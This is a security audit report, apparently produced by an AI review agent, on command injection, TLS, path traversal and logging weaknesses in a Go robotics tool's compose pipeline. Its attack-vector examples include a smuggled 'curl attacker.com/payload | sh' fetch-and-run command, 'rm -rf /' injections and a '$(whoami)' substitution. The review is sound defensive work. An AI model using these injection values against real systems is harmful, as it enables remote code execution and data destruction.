# Security Review

**Reviewer**: Security Review Agent
**Date**: 2026-04-11
**Scope**: New/modified code in the process-compose compilation pipeline, embedded NATS, health server, CLI commands, config parsing, and robot runtime.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1     |
| High     | 3     |
| Medium   | 5     |
| Low      | 4     |

---

## Critical Findings

### S-01: Command injection via unsanitized config values in podman command construction

**File**: `pkg/compose/compiler.go` lines 316-352
**Severity**: Critical
**CWE**: CWE-78 (OS Command Injection)
**OWASP**: A05:2025 (Injection)

The `addContainerServiceProcess` method constructs a shell command string by concatenating user-controlled config values without any sanitization or quoting:

```go
parts := []string{"podman run --rm --name " + svc.Name}
network := "host"
if container.Network != "" {
    network = container.Network
}
parts = append(parts, "--network "+network)

for _, device := range container.Devices {
    parts = append(parts, "--device "+device)
}
for _, volume := range container.Volumes {
    parts = append(parts, "-v "+volume)
}
for _, key := range envKeys {
    parts = append(parts, fmt.Sprintf("-e %s=%s", key, allEnv[key]))
}
```

The resulting command string is written to a process-compose YAML file and later executed by a shell. Any of these fields (service name, network, devices, volumes, environment values, image name) can contain shell metacharacters that would be interpreted by the shell when process-compose executes the command.

**Attack vector**: A malicious or compromised RDL config file with values like:
- `"network": "host; curl attacker.com/payload | sh"`
- `"devices": ["/dev/video0; rm -rf /"]`
- `"volumes": ["/tmp:/tmp; malicious-command"]`
- Environment values containing `$(command)` or backticks

**Recommendation**: Either:
1. Shell-quote all interpolated values using a proper shell quoting function (e.g., `shellescape` / `shlex.Quote` equivalent in Go), OR
2. Use process-compose's array-based command syntax if supported, OR
3. Validate all values against a strict allowlist pattern (alphanumeric, slashes, colons, dots, hyphens only).

The same issue applies to `addNativeBinaryServiceProcess` (line 278-280) where `svc.External.Command` and `svc.External.Args` are concatenated into a shell command string.

---

## High Findings

### S-02: Command injection in native binary service command construction

**File**: `pkg/compose/compiler.go` lines 278-280
**Severity**: High
**CWE**: CWE-78 (OS Command Injection)
**OWASP**: A05:2025 (Injection)

```go
command := svc.External.Command
if len(svc.External.Args) > 0 {
    command += " " + strings.Join(svc.External.Args, " ")
}
```

Args from config are joined without shell escaping. An arg like `; rm -rf /` would be interpreted by the shell.

Similarly, `addDeviceResetProcesses` (line 237) and `addGoraiProcess` (line 160) build command strings from config values:
```go
Command: fmt.Sprintf("gorai device reset --nats-prefix %s --device-id %s", device.NATSPrefix, device.ID)
Command: fmt.Sprintf("gorai run %s", c.configPath)
```

While `device.NATSPrefix` and `device.ID` are partially validated by `validateName`, the config path is not sanitized.

**Recommendation**: Shell-quote all interpolated arguments, or use a validation function to reject values containing shell metacharacters before they reach the command builder.

### S-03: Temp file not cleaned up after syscall.Exec in runCompose

**File**: `cmd/gorai/commands/run.go` lines 197-215
**Severity**: High
**CWE**: CWE-459 (Incomplete Cleanup)
**OWASP**: A02:2025 (Security Misconfiguration)

```go
tmpFile, err := os.CreateTemp("", "gorai-compose-*.yaml")
...
return syscall.Exec(pcPath, execArgs, os.Environ())
```

`syscall.Exec` replaces the current process entirely, so no cleanup code (including deferred `os.Remove`) will ever run. The temp file containing the full compiled process-compose YAML (which includes NATS URLs, environment variables, and service configuration) persists indefinitely in the system temp directory.

**Recommendation**: Either:
1. Write to a deterministic path (e.g., `.gorai/process-compose.yaml` in the project directory) that can be cleaned up, OR
2. Have the exec'd process-compose handle cleanup, OR
3. Use a well-known temp path and clean it up on subsequent runs.

### S-04: Environment variable values not sanitized in container environment injection

**File**: `pkg/compose/compiler.go` lines 344-346, `pkg/config/service_merger.go` lines 184+
**Severity**: High
**CWE**: CWE-78 (OS Command Injection), CWE-74 (Injection)
**OWASP**: A05:2025 (Injection)

Environment variable values from `svc.External.Env` and resolved environment are interpolated into the podman command without quoting:

```go
parts = append(parts, fmt.Sprintf("-e %s=%s", key, allEnv[key]))
```

An env value containing spaces or shell metacharacters will break the command or enable injection. For example, an env value of `foo$(whoami)bar` would execute `whoami` in the shell context.

**Recommendation**: Shell-quote environment values, or use `--env-file` to pass environment variables through a file instead of command-line arguments.

---

## Medium Findings

### S-05: No TLS minimum version enforcement on embedded NATS server

**File**: `pkg/embeddednats/server.go` lines 78-83
**Severity**: Medium
**CWE**: CWE-326 (Inadequate Encryption Strength)
**OWASP**: A04:2025 (Cryptographic Failures)

When TLS is configured, the code passes cert/key/CA paths to the NATS server options but does not set `TLSConfig.MinVersion` or any cipher suite restrictions:

```go
if config.TLS != nil {
    options.TLSCert = config.TLS.CertFile
    options.TLSKey = config.TLS.KeyFile
    options.TLSCaCert = config.TLS.CAFile
    options.TLS = true
}
```

The NATS server library may default to TLS 1.0 or 1.1, which have known vulnerabilities.

**Recommendation**: Set `options.TLSConfig` with `MinVersion: tls.VersionTLS12` explicitly, or verify that the nats-server library defaults to TLS 1.2+.

### S-06: No validation of NATS URL scheme allows unexpected protocols

**File**: `pkg/robot/robot.go` lines 332-351, `pkg/config/config.go` lines 104-118
**Severity**: Medium
**CWE**: CWE-918 (SSRF)
**OWASP**: A01:2025 (Broken Access Control / SSRF)

The `parseNATSURL` function and `IsLocalURL` parse any URL without validating the scheme. A config file could specify `file:///etc/passwd` or `http://internal-service:8080` as a NATS URL. While the NATS client library would likely reject non-nats schemes, the URL is also used in other contexts (environment variables, process-compose readiness probes):

```go
Command: fmt.Sprintf("nats-server --signal check=%s", natsURL),
```

A crafted URL could inject arguments into the `nats-server --signal` command.

**Recommendation**: Validate that NATS URLs use only `nats://` or `tls://` schemes before using them. Reject any other scheme at config validation time.

### S-07: Compile output path is user-controlled without path traversal protection

**File**: `cmd/gorai/commands/compile.go` line 75
**Severity**: Medium
**CWE**: CWE-22 (Path Traversal)
**OWASP**: A01:2025 (Broken Access Control)

```go
if err := os.WriteFile(outputPath, yamlBytes, 0644); err != nil {
```

The `outputPath` comes directly from the `--output` flag with no validation. A user could specify `--output /etc/cron.d/malicious` or `--output ../../../some/sensitive/path`. While this is a CLI tool where the user is trusted, in CI/CD pipelines or when invoked by automation, this could be exploited.

**Recommendation**: Validate that the output path is within the current working directory or a designated output directory.

### S-08: Config file environment variable expansion could leak sensitive values

**File**: `pkg/config/config.go` lines 526-542
**Severity**: Medium
**CWE**: CWE-200 (Information Exposure)
**OWASP**: A02:2025 (Security Misconfiguration)

The `expandEnvVars` function expands `${VAR}` references in the config JSON using `os.Getenv`. While the `jsonEscapeValue` function prevents JSON structure injection, the expanded values (which may include secrets from environment variables) end up in the config struct and could be logged, serialized, or written to the process-compose YAML output file.

The process-compose YAML produced by the compiler contains NATS URLs, environment variables, and other potentially sensitive configuration in plaintext on disk.

**Recommendation**: Document that process-compose YAML output files may contain secrets and should have restricted permissions. Consider writing the file with `0600` permissions instead of `0644`.

### S-09: Health server has no read/write timeouts

**File**: `pkg/health/server.go` lines 64-65
**Severity**: Medium
**CWE**: CWE-400 (Resource Exhaustion)
**OWASP**: A02:2025 (Security Misconfiguration)

```go
server.httpServer = &http.Server{
    Handler: server.handler(),
}
```

The HTTP server is created without `ReadTimeout`, `WriteTimeout`, or `IdleTimeout`. A slow-loris attack or misbehaving client could hold connections open indefinitely and exhaust file descriptors.

**Recommendation**: Set timeouts on the `http.Server`:
```go
server.httpServer = &http.Server{
    Handler:      server.handler(),
    ReadTimeout:  5 * time.Second,
    WriteTimeout: 5 * time.Second,
    IdleTimeout:  30 * time.Second,
}
```

---

## Low Findings

### S-10: File permissions on compiled YAML are world-readable

**File**: `cmd/gorai/commands/compile.go` line 75
**Severity**: Low
**CWE**: CWE-732 (Incorrect Permission Assignment)
**OWASP**: A02:2025 (Security Misconfiguration)

`os.WriteFile(outputPath, yamlBytes, 0644)` creates the file as world-readable. If the YAML contains NATS credentials or sensitive environment variables, other users on the system can read them.

**Recommendation**: Use `0600` permissions for the output file.

### S-11: NATS credentials file path exposed in config without access control

**File**: `pkg/config/config.go` line 91
**Severity**: Low
**CWE**: CWE-522 (Insufficiently Protected Credentials)
**OWASP**: A07:2025 (Authentication Failures)

`NATSConfig.CredentialsFile` stores a file path to NATS credentials. This value is not validated for existence, permissions, or accessibility. The path is not used in the current new code but exists in the schema and could be propagated to environment variables or command lines in future code.

**Recommendation**: When credentials_file is set, validate that the file exists and has restrictive permissions (e.g., `0600`). Ensure the path is never logged or written to process-compose output.

### S-12: NATS connection URL logged in plaintext

**File**: `pkg/robot/robot.go` line 374, `pkg/embeddednats/server.go` line 111
**Severity**: Low
**CWE**: CWE-532 (Information Exposure Through Log Files)
**OWASP**: A09:2025 (Logging Failures)

```go
r.logger.Info("Connected to NATS", "url", natsURL)
server.logger.Info("embedded NATS server started", "url", server.ClientURL())
```

If NATS URLs contain embedded credentials (e.g., `nats://user:password@host:4222`), these will be logged in plaintext.

**Recommendation**: Sanitize NATS URLs before logging by stripping any userinfo component.

### S-13: Device ID and NATS prefix used in topic construction without strict validation

**File**: `cmd/gorai/commands/device.go` line 74
**Severity**: Low
**CWE**: CWE-20 (Improper Input Validation)
**OWASP**: A03:2025 (Injection)

```go
topic := fmt.Sprintf("%s.%s.tx.system.reset", natsPrefix, deviceID)
```

The `natsPrefix` and `deviceID` values come from command-line arguments without validation. While NATS topic injection is limited in impact (it can only publish to unexpected topics, not execute code), a malicious prefix like `>` could publish to a wildcard subject.

**Recommendation**: Validate that `natsPrefix` and `deviceID` match the expected pattern (alphanumeric, hyphens, underscores, dots only).

---

## Dependency Assessment

### nats-server/v2 (github.com/nats-io/nats-server/v2)

- **Risk**: Low. Well-maintained, widely used, CNCF project. No known critical CVEs in recent versions.
- **Concern**: Embedding a full NATS server increases the attack surface. The embedded server listens on a network port and accepts connections.
- **Mitigation**: Default binding to `127.0.0.1` (not `0.0.0.0`) is correct and limits exposure to localhost.

### yaml.v3 (gopkg.in/yaml.v3)

- **Risk**: Low. Standard Go YAML library. No known deserialization RCE vectors in Go's yaml.v3 (unlike Python's PyYAML `yaml.load`).
- **Concern**: The library is used to generate YAML output, not to parse untrusted input, further reducing risk.

---

## Positive Security Observations

1. **Embedded NATS binds to localhost by default** (`defaultHost = "127.0.0.1"`) -- prevents unintended network exposure.
2. **Health server binds to localhost by default** (`defaultListenAddress = "127.0.0.1:4180"`) -- not exposed to the network.
3. **External command validation** in `validateExternalCommand()` requires absolute paths, rejects shell metacharacters, and checks executability -- good defense-in-depth for the direct-exec path in `robot.go`.
4. **Config env var expansion uses JSON escaping** (`jsonEscapeValue`) to prevent JSON structure injection from environment variable values.
5. **Name validation** via `validateName()` restricts names to `[a-zA-Z][a-zA-Z0-9_-]*` with a 63-char limit, which limits injection surface for names used in commands.
6. **Health endpoints return only fixed status strings** (`"ready"`, `"not_ready"`, `"alive"`) -- no information disclosure risk.
7. **NATS readiness probe** uses method-restricted routes (`GET /healthz`, `GET /livez`).
